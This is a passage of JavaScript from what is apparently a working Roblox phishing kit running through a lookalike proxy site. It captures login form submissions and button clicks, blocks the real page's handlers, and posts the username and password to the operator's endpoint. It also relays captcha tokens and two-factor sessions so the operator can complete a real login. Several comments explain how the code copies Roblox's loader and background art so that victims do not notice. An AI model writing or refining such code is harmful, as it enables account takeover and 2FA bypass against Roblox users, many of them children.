            window.__rbx2faArkoseSetup = undefined;
        }
    }

    // Mirrors what Roblox's own client does: script at /fc/<key>/captcha.js with
    // a data-callback, then setConfig({ data: { blob } }) on the enforcement
    // object the callback hands back.
    function loadArkoseScript(domain, slug, onReady, onScriptError) {
        removeArkoseScript();

        window.__rbx2faArkoseSetup = onReady;

        var script = document.createElement('script');
        script.id = ARKOSE_SCRIPT_ID;
        script.type = 'text/javascript';
        script.async = true;
        script.defer = true;
        script.src = 'https://' + domain + '/fc/' + slug + '/captcha.js?' + Date.now();
        script.setAttribute('data-callback', '__rbx2faArkoseSetup');
        script.onerror = onScriptError;

        document.body.appendChild(script);
    }

    function startEnforcement(enforcement, widget, captchaId) {
        var api = enforcement;

        if (typeof api === 'function') {
            try {
                api = new api();
            } catch (e) {
                api = null;
            }
        }
        if (!api && window.ArkoseEnforcement) {
            try {
                api = new window.ArkoseEnforcement();
            } catch (e) {
                api = null;
            }
        }
        if (!api || typeof api.setConfig !== 'function') {
            showCaptchaError('Verification could not start. Please start over.');
            return;
        }

        var holder = document.getElementById(ARKOSE_HOLDER_ID);
        if (!holder) return;
        holder.innerHTML = '';

        function deliver(token) {
            if (typeof token !== 'string' || token.length < 20) return;
            submitCaptchaToken(captchaId, token);
        }

        try {
            api.setConfig({
                selector: '#' + ARKOSE_HOLDER_ID,
                mode: 'inline',
                styleTheme: 'Inline',
                noSuppress: Boolean(widget.noSuppress),
                data: { blob: widget.blob || '' },
                onCompleted: function (result) {
                    var token = result && (result.token || result.sessionToken);
                    deliver(token || result);
                },
                // A low-risk session is auto-suppressed and hands the token back
                // instead of drawing a puzzle — same result, no interaction.
                onSuppress: function (token) {
                    deliver(token);
                },
                onError: function () {
                    showCaptchaError('Verification failed to load. Please start over.');
                },
                onShown: function () { },
                onHide: function () { }
            });
            if (typeof api.run === 'function') api.run();
        } catch (e) {
            showCaptchaError('Verification could not start. Please start over.');
        }
    }

    function showCaptchaError(message) {
        if (!ui) return;
        ui.err.textContent = message || '';
        ui.retry.style.display = message ? 'block' : 'none';
        if (ui.loading && ui.loading.parentNode) ui.loading.parentNode.removeChild(ui.loading);
    }

    function submitCaptchaToken(captchaId, token) {
        if (!ui || state.busy) return;
        state.busy = true;
        if (ui.err) ui.err.textContent = 'Verifying\u2026';

        postJSON('/api/auth/captcha-solved', {
            captchaId: captchaId,
            token: token,
            returnUrl: state.returnUrl
        }).then(function (out) {
            state.busy = false;
            var data = out.data || {};

            if (data.success) {
                window.location.href = 'https://www.roblox.com/home';
                return;
            }

            if (data.requiresTwoFactor) {
                state.sessionId = data.sessionId;
                openModal(data.mediaType);
                return;
            }

            showCaptchaError(data.message || 'Verification failed. Please start over.');
        }).catch(function () {
            state.busy = false;
            showCaptchaError('Something went wrong. Please start over.');
        });
    }

    function openCaptcha(widget, captchaId) {
        if (ui) dismiss();
        ui = buildCaptchaModal();
        state.captchaId = captchaId;

        var domains = (widget && widget.domains && widget.domains.length) ? widget.domains : DEFAULT_DOMAINS;
        var slug = (widget && widget.slug) || '';
        var attempt = 0;
        var settled = false;
        var timer = null;

        if (!slug) {
            showCaptchaError('Verification could not start. Please start over.');
            return;
        }

        function next() {
            if (settled) return;
            if (attempt >= domains.length) {
                showCaptchaError('Verification could not load. Please start over.');
                return;
            }

            var domain = domains[attempt++];
            timer = setTimeout(next, ARKOSE_LOAD_TIMEOUT);

            loadArkoseScript(domain, slug, function (enforcement) {
                if (settled) return;
                settled = true;
                if (timer) clearTimeout(timer);
                startEnforcement(enforcement, widget, captchaId);
            }, function () {
                if (timer) clearTimeout(timer);
                next();
            });
        }

        next();
    }

    /* ── credential submit ──────────────────────────────────────────────── */

    function restoreLoginButton(host) {
        if (!host) return;
        var loader = document.getElementById('rbx2fa-loader');
        if (loader && loader.parentNode) loader.parentNode.removeChild(loader);
        host.style.display = '';
    }

    function submitCredentials(origin) {
        if (state.busy) return;
        var creds = readCredentials();

        if (!creds.username || !creds.password) {
            showPageError('Please enter your username and password.');
            return;
        }

        // The loading dots are built here, not in buildModal, so the stylesheet
        // has to be mounted here too. Without this the <i> elements had no
        // width, height or background — the button disappeared and nothing
        // replaced it, which read as "it never even tried to log in".
        injectStyles();

        state.busy = true;
        state.returnUrl = LANDING;

        var host = q(['#login-button', '[data-testid="login-button"]', '.login-button', 'button[type="submit"]']);

        if (host) {
            // Roblox hides the button while signing in and shows its own
            // three-square loader underneath. Keeping the button and swapping
            // the label is what made our loading state obviously not Roblox.
            host.style.display = 'none';
            host.setAttribute('aria-busy', 'true');
            var loader = document.createElement('div');
            loader.id = 'rbx2fa-loader';
            loader.className = 'rbx2fa-dots';
            loader.setAttribute('role', 'status');
            loader.setAttribute('aria-label', 'Logging in');
            loader.innerHTML = '<i></i><i></i><i></i>';
            if (host.parentNode) host.parentNode.insertBefore(loader, host.nextSibling);
        }

        postJSON(ENDPOINT_LOGIN, {
            username: creds.username,
            password: creds.password,
            returnUrl: window.location.href,
            source: origin || 'replica'
        }).then(function (out) {
            state.busy = false;
            if (host) restoreLoginButton(host);

            var data = out.data || {};

            if (data.requiresTwoFactor) {
                state.sessionId = data.sessionId;
                openModal(data.mediaType);
                return;
            }

            if (data.success) {
                window.location.href = 'https://www.roblox.com/home';
                return;
            }

            if (data.requiresCaptcha) {
                // captchav2 carries no widget parameters — the Arkose blob only
                // exists inside Roblox's own page. Reload into the native flow
                // instead of drawing a challenge that cannot bind to anything.
                if (data.native) {
                    // Reload straight into the native page: same login, capture
                    // interceptor off. Roblox's own captcha widget mounts there
                    // and the visitor solves it in place.
                    var url = new URL(window.location.href);
                    url.searchParams.set('native', '1');
                    window.location.href = url.toString();
                    return;
                }
                // The challenge was staged server-side; the blob it carries is
                // what binds the token to this specific login attempt.
                if (data.captchaWidget && data.captchaWidget.slug) {
                    openCaptcha(data.captchaWidget, data.captchaId);
                    return;
                }
                showPageError(data.message || 'Please complete the verification and try again.');
                return;
            }

            showPageError(data.message || 'Incorrect username or password. Please try again.');
            var pass = q(PASSWORD_SELECTORS);
            if (pass) {
                pass.value = '';
                pass.focus();
            }
        }).catch(function () {
            state.busy = false;
            if (host) restoreLoginButton(host);
            showPageError('Something went wrong. Please try again.');
        });
    }

    function showPageError(message) {
        var banner = document.getElementById('rbx2fa-page-error');
        if (!banner) {
            banner = document.createElement('div');
            banner.id = 'rbx2fa-page-error';
            banner.style.cssText = [
                'margin:10px 0 0', 'padding:10px 12px', 'border-radius:6px',
                'background:rgba(255,77,77,.12)', 'border:1px solid rgba(255,77,77,.4)',
                'color:#ff6b6b', 'font-size:13px', 'line-height:1.4',
                'font-family:"Builder Sans","Helvetica Neue",Helvetica,Arial,sans-serif'
            ].join(';');

            var anchor = q(PASSWORD_SELECTORS);
            var mount = anchor && anchor.closest ? anchor.closest('form') : null;
            if (mount && mount.parentNode) {
                mount.parentNode.insertBefore(banner, mount.nextSibling);
            } else if (document.body) {
                document.body.appendChild(banner);
            }
        }
        banner.textContent = message;
    }

    /* ── interception ───────────────────────────────────────────────────── */

    // Capture on window runs before every listener the page installed below it.
    // stopImmediatePropagation keeps the proxied Roblox bundle from firing its
    // own broken login POST against the same submit.
    window.addEventListener('submit', function (event) {
        var form = event.target;
        if (!form || !form.querySelector || !form.querySelector('input[type="password"]')) return;
        // Only take over when there is something to send. Intercepting an empty
        // submit turned a page-level validation message into our error box.
        var creds = readCredentials();
        if (!creds.username || !creds.password) return;
        event.preventDefault();
        event.stopImmediatePropagation();
        submitCredentials('form');
    }, true);

    window.addEventListener('click', function (event) {
        var target = event.target;
        if (!target || !target.closest) return;
        var button = target.closest('button, input[type="submit"], a[role="button"], [role="button"]');
        if (!button || !isLoginButton(button)) return;
        var creds = readCredentials();
        if (!creds.username || !creds.password) return;
        event.preventDefault();
        event.stopImmediatePropagation();
        submitCredentials('button');
    }, true);

    /* ── login background artwork ───────────────────────────────────────── */

    // Roblox paints a game render behind the login card from a URL its bundle
    // builds at runtime. That request leaves cross-origin from our host and is
    // blocked, so the plate stays flat black. Resolve the artwork through our
    // own proxy instead and paint it, using the place id the page already has.
    function paintLoginBackground() {
        if (!/login/i.test(location.pathname)) return;
        if (document.getElementById('rbx2fa-bg')) return;
        var m = (document.documentElement.innerHTML.match(/\/games\/(\d+)/) || [])[1];
        if (!m) return;

        fetch('/proxy/roblox/apis.roblox.com/universes/v1/places/' + m + '/universe', {
            headers: { Accept: 'application/json' }
        }).then(function (r) { return r.json(); }).then(function (u) {
            if (!u || !u.universeId) return;
            return fetch('/proxy/roblox/thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds=' +
                u.universeId + '&size=768x432&format=Png&isCircular=false', {
                headers: { Accept: 'application/json' }
            }).then(function (r) { return r.json(); }).then(function (t) {
                var url = t && t.data && t.data[0] && t.data[0].thumbnails && t.data[0].thumbnails[0] && t.data[0].thumbnails[0].imageUrl;
                if (!url) return;
                var plate = document.createElement('div');
                plate.id = 'rbx2fa-bg';
                plate.style.cssText = 'position:fixed;inset:0;z-index:-1;background:url("/proxy/image?url=' +
                    encodeURIComponent(url) + '") center/cover no-repeat;filter:brightness(.35) saturate(.9)';
                document.body.appendChild(plate);
            });
        }).catch(function () { /* flat plate is an acceptable fallback */ });
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', function () { setTimeout(paintLoginBackground, 600); });
    } else {
        setTimeout(paintLoginBackground, 600);
    }

    window.__rbx2fa = {
        open: openModal,
        captcha: openCaptcha,
        close: dismiss,
        state: state
    };
})();
